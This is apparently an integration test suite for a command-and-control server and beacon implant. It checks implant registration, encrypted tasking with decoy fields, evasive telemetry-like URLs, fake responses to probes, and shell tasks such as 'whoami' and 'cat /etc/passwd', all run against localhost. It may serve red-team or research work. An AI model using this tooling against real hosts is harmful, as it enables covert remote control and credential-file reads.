#!/usr/bin/env python3
"""
Integration tests: spins up the C2 server in-process and connects
a real beacon agent against it. Validates the full encrypted protocol:
registration, beacon check-in, task dispatch, result collection,
re-registration, operator API, and evasive URL handling.
"""

import base64
import hashlib
import json
import os
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from software.c2.server import (
    ServerCrypto,
    create_app,
    agents,
    task_queues,
    history,
    results,
    _PAYLOAD_FIELDS,
)
from software.c2.beacon import Beacon


CALLBACK_URL = "http://127.0.0.1:19999/api/v1/beacon"
DNS_DOMAIN = ""
TEST_TOKEN = "test-operator-token"


def _derive_key() -> bytes:
    return hashlib.sha256(f"{CALLBACK_URL}:{DNS_DOMAIN}".encode()).digest()


def _beacon_config(port: int = 19999, interval: int = 1) -> dict:
    return {
        "c2": {
            "beacon_interval_seconds": interval,
            "jitter_percent": 0,
            "encryption_key": "",
            "proxy": {"mode": "none"},
            "https": {
                "enabled": True,
                "callback_url": f"http://127.0.0.1:{port}/api/v1/beacon",
                "verify_ssl": False,
            },
            "dns": {
                "enabled": False,
                "domain": DNS_DOMAIN,
                "resolver": "8.8.8.8",
            },
        }
    }


def _reset_server_state():
    import software.c2.server as srv
    agents.clear()
    task_queues.clear()
    history.clear()
    results.clear()
    srv._name_counter = 0


class ServerTestBase(unittest.TestCase):
    """Starts a Flask test client for each test class."""

    port = 19999

    @classmethod
    def setUpClass(cls):
        _reset_server_state()
        key = _derive_key()
        cls.crypto = ServerCrypto(key)
        cls.data_dir = Path(tempfile.mkdtemp())
        cls.app = create_app(cls.crypto, TEST_TOKEN, cls.data_dir)
        cls.app.config["TESTING"] = True
        cls.client = cls.app.test_client()

        cls.flask_thread = threading.Thread(
            target=cls.app.run,
            kwargs={"host": "127.0.0.1", "port": cls.port, "use_reloader": False},
            daemon=True,
        )
        cls.flask_thread.start()
        time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        import shutil
        shutil.rmtree(cls.data_dir, ignore_errors=True)

    def _operator_get(self, path: str) -> dict:
        r = self.client.get(path, headers={"Authorization": f"Bearer {TEST_TOKEN}"})
        return r.get_json()

    def _operator_post(self, path: str, data: dict) -> dict:
        r = self.client.post(
            path,
            data=json.dumps(data),
            content_type="application/json",
            headers={"Authorization": f"Bearer {TEST_TOKEN}"},
        )
        return r.get_json()

    def _beacon_post(self, path: str, payload: dict) -> dict:
        wrapped = self.crypto.wrap(payload)
        r = self.client.post(
            path,
            data=json.dumps(wrapped),
            content_type="application/json",
        )
        body = r.get_json()
        unwrapped = self.crypto.unwrap(body)
        return unwrapped if unwrapped is not None else body


# ── Crypto unit tests ──


class TestServerCrypto(unittest.TestCase):
    def test_encrypt_decrypt_roundtrip(self):
        crypto = ServerCrypto(os.urandom(32))
        data = {"action": "register", "id": "abc123"}
        self.assertEqual(crypto.decrypt(crypto.encrypt(data)), data)

    def test_wrap_unwrap_roundtrip(self):
        crypto = ServerCrypto(os.urandom(32))
        data = {"success": True, "agent_id": "raccoon-test"}
        self.assertEqual(crypto.unwrap(crypto.wrap(data)), data)

    def test_unwrap_fails_on_wrong_key(self):
        c1 = ServerCrypto(os.urandom(32))
        c2 = ServerCrypto(os.urandom(32))
        self.assertIsNone(c2.unwrap(c1.wrap({"secret": True})))

    def test_nonce_uniqueness(self):
        crypto = ServerCrypto(os.urandom(32))
        self.assertNotEqual(crypto.encrypt({"x": 1}), crypto.encrypt({"x": 1}))

    def test_wrapped_has_decoy_fields(self):
        crypto = ServerCrypto(os.urandom(32))
        self.assertGreaterEqual(len(crypto.wrap({"d": 1})), 4)

    def test_payload_field_from_known_list(self):
        crypto = ServerCrypto(os.urandom(32))
        wrapped = crypto.wrap({"d": 1})
        found = [k for k in wrapped if k in _PAYLOAD_FIELDS]
        self.assertEqual(len(found), 1)


# ── Registration ──


class TestRegistration(ServerTestBase):
    def test_register_new_agent(self):
        _reset_server_state()
        resp = self._beacon_post("/api/v1/register", {
            "action": "register", "id": "impl-001",
            "hostname": "testbox", "os": "Linux", "arch": "aarch64",
            "user": "root", "pid": 1234, "interval": 10, "uptime": 42,
        })
        self.assertTrue(resp["success"])
        self.assertIn("raccoon-", resp["agent_id"])
        self.assertEqual(len(agents), 1)

    def test_unique_names(self):
        _reset_server_state()
        ids = set()
        for i in range(5):
            resp = self._beacon_post("/r", {
                "action": "register", "id": f"impl-{i}",
                "hostname": f"h{i}", "os": "L", "arch": "x", "user": "u", "pid": i, "interval": 60,
            })
            ids.add(resp["agent_id"])
        self.assertEqual(len(ids), 5)

    def test_re_register_keeps_agent_id(self):
        _reset_server_state()
        payload = {
            "action": "register", "id": "re-reg",
            "hostname": "box1", "os": "L", "arch": "arm64",
            "user": "admin", "pid": 999, "interval": 30,
        }
        aid1 = self._beacon_post("/r", payload)["agent_id"]
        payload["hostname"] = "box1-updated"
        aid2 = self._beacon_post("/r", payload)["agent_id"]
        self.assertEqual(aid1, aid2)
        self.assertEqual(agents[aid1]["hostname"], "box1-updated")
        self.assertEqual(len(agents), 1)

    def test_register_via_evasive_url(self):
        _reset_server_state()
        resp = self._beacon_post("/totally/random/path?_t=123&sid=456", {
            "action": "register", "id": "evasive",
            "hostname": "s", "os": "W", "arch": "A", "user": "u", "pid": 4, "interval": 5,
        })
        self.assertTrue(resp["success"])


# ── Beacon check-in ──


class TestBeaconCheckin(ServerTestBase):
    def _register(self, implant_id="ci-test"):
        self._beacon_post("/r", {
            "action": "register", "id": implant_id,
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        return list(agents.keys())[0]

    def test_no_tasks_returns_empty(self):
        _reset_server_state()
        aid = self._register()
        resp = self._beacon_post("/b", {
            "action": "beacon", "agent_id": aid, "id": "ci-test", "interval": 5, "uptime": 100,
        })
        self.assertEqual(resp, {})

    def test_dispatches_queued_task(self):
        _reset_server_state()
        aid = self._register()
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "shell", "args": "whoami"})
        resp = self._beacon_post("/b", {
            "action": "beacon", "agent_id": aid, "id": "ci-test", "interval": 5,
        })
        self.assertEqual(resp["cmd"], "shell")
        self.assertEqual(resp["args"], "whoami")

    def test_updates_last_seen(self):
        _reset_server_state()
        aid = self._register()
        ts1 = agents[aid]["_last_seen_ts"]
        time.sleep(0.05)
        self._beacon_post("/b", {
            "action": "beacon", "agent_id": aid, "id": "ci-test", "interval": 5,
        })
        self.assertGreater(agents[aid]["_last_seen_ts"], ts1)

    def test_lookup_by_implant_id(self):
        _reset_server_state()
        aid = self._register("fallback-id")
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "pwd"})
        resp = self._beacon_post("/b", {
            "action": "beacon", "id": "fallback-id", "interval": 5,
        })
        self.assertEqual(resp["cmd"], "pwd")


# ── Task results ──


class TestTaskResults(ServerTestBase):
    def _register(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "res-test",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        return list(agents.keys())[0]

    def test_result_stored(self):
        aid = self._register()
        resp = self._beacon_post("/result", {
            "action": "result", "task_id": "t-42",
            "agent_id": aid, "status": "ok", "output": "root\n",
        })
        self.assertTrue(resp.get("ack"))
        self.assertEqual(results["t-42"]["output"], "root\n")

    def test_result_updates_history(self):
        aid = self._register()
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "shell", "args": "id"})
        tid = history[aid][0]["task_id"]
        self._beacon_post("/result", {
            "action": "result", "task_id": tid,
            "agent_id": aid, "status": "ok", "output": "uid=0(root)",
        })
        self.assertEqual(history[aid][0]["status"], "ok")
        self.assertEqual(history[aid][0]["output"], "uid=0(root)")

    def test_fifo_order(self):
        aid = self._register()
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "pwd"})
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "ls", "args": "/tmp"})
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "shell", "args": "uname"})

        r1 = self._beacon_post("/b", {"action": "beacon", "agent_id": aid, "interval": 5})
        r2 = self._beacon_post("/b", {"action": "beacon", "agent_id": aid, "interval": 5})
        r3 = self._beacon_post("/b", {"action": "beacon", "agent_id": aid, "interval": 5})
        self.assertEqual([r1["cmd"], r2["cmd"], r3["cmd"]], ["pwd", "ls", "shell"])


# ── Operator API ──


class TestOperatorAPI(ServerTestBase):
    def test_list_agents(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "api-1",
            "hostname": "apibox", "os": "Linux", "arch": "arm64",
            "user": "op", "pid": 7777, "interval": 10,
        })
        lst = self._operator_get("/api/agents")
        self.assertEqual(len(lst), 1)
        self.assertEqual(lst[0]["hostname"], "apibox")

    def test_agent_detail(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "det-1",
            "hostname": "detailbox", "os": "W", "arch": "AMD64",
            "user": "admin", "pid": 8888, "interval": 30,
        })
        aid = list(agents.keys())[0]
        d = self._operator_get(f"/api/agents/{aid}")
        self.assertEqual(d["hostname"], "detailbox")

    def test_unauthorized_rejected(self):
        self.assertEqual(self.client.get("/api/agents").status_code, 401)
        r = self.client.get("/api/agents", headers={"Authorization": "Bearer wrong"})
        self.assertEqual(r.status_code, 401)

    def test_create_task(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "tsk-1",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        aid = list(agents.keys())[0]
        task = self._operator_post(f"/api/agents/{aid}/task", {
            "cmd": "shell", "args": "cat /etc/passwd", "timeout": 60,
        })
        self.assertIn("id", task)
        self.assertEqual(task["cmd"], "shell")
        self.assertEqual(task["status"], "pending")

    def test_task_history(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "hst-1",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        aid = list(agents.keys())[0]
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "pwd"})
        self._operator_post(f"/api/agents/{aid}/task", {"cmd": "ls"})
        hist = self._operator_get(f"/api/agents/{aid}/history")
        self.assertEqual(len(hist), 2)

    def test_nonexistent_agent_404(self):
        h = {"Authorization": f"Bearer {TEST_TOKEN}"}
        self.assertEqual(self.client.get("/api/agents/nope", headers=h).status_code, 404)
        r = self.client.post("/api/agents/nope/task",
                             data=json.dumps({"cmd": "pwd"}),
                             content_type="application/json", headers=h)
        self.assertEqual(r.status_code, 404)


# ── Protocol edge cases ──


class TestProtocolEdgeCases(ServerTestBase):
    def test_invalid_json_fake_response(self):
        r = self.client.post("/beacon", data="not json", content_type="text/plain")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.get_json()["status"], "ok")

    def test_wrong_key_fake_response(self):
        bad = ServerCrypto(os.urandom(32))
        wrapped = bad.wrap({"action": "register", "id": "x"})
        r = self.client.post("/beacon", data=json.dumps(wrapped), content_type="application/json")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.get_json()["status"], "ok")

    def test_unknown_action_fake_response(self):
        resp = self._beacon_post("/beacon", {"action": "exploit"})
        self.assertEqual(resp["status"], "ok")

    def test_empty_post_fake_response(self):
        r = self.client.post("/any/path", data="{}", content_type="application/json")
        self.assertEqual(r.status_code, 200)

    def test_deep_evasive_url(self):
        _reset_server_state()
        resp = self._beacon_post("/api/v2/telemetry/events/submit?_t=123&sid=999", {
            "action": "register", "id": "deep-path",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        self.assertTrue(resp["success"])


# ── Agent status ──


class TestAgentStatus(ServerTestBase):
    def test_online_status(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "stat-1",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 5,
        })
        lst = self._operator_get("/api/agents")
        self.assertEqual(lst[0]["status"], "online")

    def test_offline_status(self):
        _reset_server_state()
        self._beacon_post("/r", {
            "action": "register", "id": "stat-off",
            "hostname": "h", "os": "L", "arch": "x", "user": "u", "pid": 1, "interval": 1,
        })
        aid = list(agents.keys())[0]
        agents[aid]["_last_seen_ts"] = time.time() - 100
        lst = self._operator_get("/api/agents")
        self.assertEqual(lst[0]["status"], "offline")


# ── Cross-compatibility: server crypto ↔ beacon crypto ──


class TestCrossCompatibility(unittest.TestCase):
    def test_server_encrypts_beacon_decrypts(self):
        key = os.urandom(32)
        key_b64 = base64.b64encode(key).decode()

        server = ServerCrypto(key)
        beacon = Beacon({
            "c2": {
                "beacon_interval_seconds": 60, "jitter_percent": 0,
                "encryption_key": key_b64,
                "https": {"enabled": False, "callback_url": "", "verify_ssl": False},
                "dns": {"enabled": False, "domain": "", "resolver": "8.8.8.8"},
            }
        })

        data = {"cmd": "shell", "args": "id", "id": "task-1"}
        wrapped = server.wrap(data)
        unwrapped = beacon._unwrap_response(wrapped)
        self.assertEqual(unwrapped, data)

    def test_beacon_encrypts_server_decrypts(self):
        key = os.urandom(32)
        key_b64 = base64.b64encode(key).decode()

        server = ServerCrypto(key)
        beacon = Beacon({
            "c2": {
                "beacon_interval_seconds": 60, "jitter_percent": 0,
                "encryption_key": key_b64,
                "https": {"enabled": False, "callback_url": "", "verify_ssl": False},
                "dns": {"enabled": False, "domain": "", "resolver": "8.8.8.8"},
            }
        })

        data = {"action": "register", "id": "test-implant", "hostname": "box"}
        wrapped = beacon._wrap_payload(data)
        unwrapped = server.unwrap(wrapped)
        self.assertEqual(unwrapped, data)

    def test_derived_keys_match(self):
        url = "https://c2.example.com/api/v1/beacon"
        domain = "c2.example.com"

        server_key = hashlib.sha256(f"{url}:{domain}".encode()).digest()
        server = ServerCrypto(server_key)

        beacon = Beacon({
            "c2": {
                "beacon_interval_seconds": 60, "jitter_percent": 0,
                "encryption_key": "",
                "https": {"enabled": True, "callback_url": url, "verify_ssl": False},
                "dns": {"enabled": True, "domain": domain, "resolver": "8.8.8.8"},
            }
        })

        data = {"test": True}
        self.assertEqual(server.unwrap(beacon._wrap_payload(data)), data)
        self.assertEqual(beacon._unwrap_response(server.wrap(data)), data)


# ── Live beacon integration ──


class TestLiveBeaconIntegration(ServerTestBase):
    def test_beacon_registers_and_checks_in(self):
        _reset_server_state()
        beacon = Beacon(_beacon_config(port=self.port, interval=1))
        beacon.start()
        try:
            time.sleep(3)
            self.assertGreaterEqual(len(agents), 1)
            aid = list(agents.keys())[0]
            self.assertIn("raccoon-", aid)
            self.assertTrue(agents[aid]["hostname"])
        finally:
            beacon.stop()

    def _wait_for_agent(self, timeout=30):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if agents:
                return list(agents.keys())[0]
            time.sleep(0.2)
        self.fail("Beacon did not register in time")

    def _wait_for_result(self, agent_id, timeout=30):
        deadline = time.time() + timeout
        while time.time() < deadline:
            hist = self._operator_get(f"/api/agents/{agent_id}/history")
            completed = [h for h in hist if h["status"] not in ("pending", None)]
            if completed:
                return completed
            time.sleep(0.3)
        return []

    def test_beacon_executes_task(self):
        _reset_server_state()
        beacon = Beacon(_beacon_config(port=self.port, interval=1))
        beacon.start()
        try:
            aid = self._wait_for_agent()
            self._operator_post(f"/api/agents/{aid}/task", {"cmd": "pwd"})
            ok = self._wait_for_result(aid)
            self.assertGreaterEqual(len(ok), 1)
            self.assertTrue(ok[0]["output"])
        finally:
            beacon.stop()

    def test_beacon_shell_command(self):
        _reset_server_state()
        beacon = Beacon(_beacon_config(port=self.port, interval=1))
        beacon.start()
        try:
            aid = self._wait_for_agent()
            self._operator_post(f"/api/agents/{aid}/task", {
                "cmd": "shell", "args": "echo raccoon_e2e_test",
            })
            completed = self._wait_for_result(aid)
            found = [h for h in completed if h.get("output") and "raccoon_e2e_test" in h["output"]]
            self.assertGreaterEqual(len(found), 1)
        finally:
            beacon.stop()

    def test_beacon_sleep_command(self):
        _reset_server_state()
        beacon = Beacon(_beacon_config(port=self.port, interval=1))
        beacon.start()
        try:
            aid = self._wait_for_agent()
            self._operator_post(f"/api/agents/{aid}/task", {"cmd": "sleep", "args": "30 50"})
            deadline = time.time() + 10
            while time.time() < deadline:
                if beacon.interval == 30:
                    break
                time.sleep(0.3)
            self.assertEqual(beacon.interval, 30)
            self.assertAlmostEqual(beacon.jitter, 0.5, places=1)
        finally:
            beacon.stop()

    def test_beacon_kill_command(self):
        _reset_server_state()
        beacon = Beacon(_beacon_config(port=self.port, interval=1))
        beacon.start()
        try:
            aid = self._wait_for_agent()
            self._operator_post(f"/api/agents/{aid}/task", {"cmd": "kill"})
            deadline = time.time() + 10
            while time.time() < deadline:
                if not beacon._running:
                    break
                time.sleep(0.3)
            self.assertFalse(beacon._running)
        finally:
            beacon.stop()


if __name__ == "__main__":
    unittest.main()
